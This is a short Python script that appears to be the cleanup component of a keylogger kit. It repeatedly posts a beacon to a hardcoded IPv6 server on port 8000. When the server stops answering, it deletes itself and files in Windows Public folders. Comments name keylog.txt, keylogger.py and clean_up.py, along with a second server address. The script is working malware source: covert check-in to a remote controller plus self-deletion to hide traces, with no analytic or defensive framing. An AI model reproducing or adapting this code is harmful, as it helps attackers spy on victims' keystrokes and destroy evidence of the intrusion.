import os, requests, time


def checker():
    try:
        requests.post("http://[2402:3a80:42a9:d016:6d7c:f5e:f73a:8045]:8000/checker", data={"data": "check"})
        time.sleep(10)
        checker()
    except Exception as e:
        os.remove(r"C:\Users\Public\Pictures\uffh.txt")
        os.remove(r"C:\Users\Public\Music\djsw.py")
        os.remove(__file__)

time.sleep(10)
checker()

# [2402:3a80:187a:6e66:f931:9b8c:a323:6ab5]:8000
# r"C:\Users\Public\Pictures\keylog.txt"
# r"C:\Users\Public\Videos\clean_up.py"
# r"C:\Users\Public\Music\keylogger.py"